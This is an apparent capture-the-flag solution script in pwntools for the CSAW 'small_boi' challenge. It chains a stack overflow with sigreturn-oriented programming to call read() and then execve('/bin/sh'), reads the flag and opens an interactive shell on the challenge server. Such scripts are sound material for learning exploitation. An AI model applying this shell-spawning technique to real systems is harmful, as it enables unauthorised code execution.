from pwn import *
context.log_level = 'debug'

TARGET = './small_boi'
HOST = 'pwn.chal.csaw.io'
PORT = 1002

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x4001ac
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

sigreturn_pop1 = 0x400180
rax = 0x40018a
syscall_rbp = 0x400185
syscall_rax0_rbp = 0x4001a4
bss = 0x601020

# read(0, bss, 0x100)
payload = ''
payload += 'A' * 40
payload += p64(sigreturn_pop1)
payload += p64(0) * 5
payload += p64(0)*8 # r8-15
payload += p64(0) # rdi
payload += p64(bss) # rsi
payload += p64(0) # rbp
payload += p64(0x0) # rbx
payload += p64(0x200) # rdx
payload += p64(0) # rax
payload += p64(0) # rcx
payload += p64(bss) # rsp
payload += p64(syscall_rbp) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) *4
payload += p64(0) # &fpstate
payload = payload.ljust(0x200, 'A')

r.send(payload)

# system(&"/bin/sh", NULL, NULL)
payload = ''
payload += "/bin/sh\x00"
payload += p64(sigreturn_pop1)
payload += p64(0) * 5
payload += p64(0)*8 # r8-15
payload += p64(bss) # rdi
payload += p64(0) # rsi
payload += p64(0) # rbp
payload += p64(0x0) # rbx
payload += p64(0x0) # rdx
payload += p64(0x3b) # rax
payload += p64(0) # rcx
payload += p64(bss) # rsp
payload += p64(syscall_rbp) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) *4
payload += p64(0) # &fpstate
sleep(1)
r.sendline(payload)
r.sendline("cat f*")

r.interactive()
r.close()
